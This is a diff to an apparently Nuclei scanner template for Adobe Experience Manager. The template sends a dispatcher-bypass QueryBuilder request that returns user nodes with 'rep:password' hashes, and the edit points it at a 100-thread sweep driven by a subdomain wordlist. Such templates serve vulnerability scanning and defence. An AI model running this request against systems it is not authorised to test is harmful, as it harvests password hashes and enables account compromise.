@@ -1,30 +1,29 @@
 id: aem-hash-querybuilder
 
 info:
-  name: Query hashed password via QueryBuilder Servlet
   author: DhiyaneshDk
+  name: Query hashed password via QueryBuilder Servlet
   severity: medium
-  description: AEM hased password can be queried via QueryBuilder Servlet.
-  reference:
-    - https://twitter.com/AEMSecurity/status/1372392101829349376
-  classification:
-    cpe: cpe:2.3:a:adobe:acs_aem_commons:*:*:*:*:*:*:*:*
-  metadata:
-    max-request: 1
-    vendor: adobe
-    product: acs_aem_commons
-    shodan-query: http.component:"Adobe Experience Manager"
-  tags: aem,misconfig
+  reference: https://twitter.com/AEMSecurity/status/1372392101829349376
+  tags: aem
 
-http:
-  - raw:
+requests:
+  - payloads:
+      Subdomains: /home/mahmoud/Wordlist/AllSubdomains.txt
+    attack: sniper
+    threads: 100
+
+    raw:
       - |
         GET /bin/querybuilder.json.;%0aa.css?p.hits=full&property=rep:authorizableId&type=rep:User HTTP/1.1
-        Host: {{Hostname}}
+        Host: {{Subdomains}}
+        User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
         Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
         Accept-Language: en-US,en;q=0.5
         Accept-Encoding: gzip, deflate
-
+        Connection: close
+        Upgrade-Insecure-Requests: 1
+        Cache-Control: max-age=0
     matchers-condition: and
     matchers:
       - type: status
@@ -36,4 +35,3 @@ http:
           - '"success":true'
           - 'rep:password'
         condition: and
-# digest: 490a00463044022033fc5bd5795df2a06a10d63c8642552f56b20462f231ad98cf90b45c2d3461710220783fb9a3b2f96828b63284079e0751af43e399e2974717e6d1f918785b15ecdc:922c64590222798bb761d5b6d8e72950
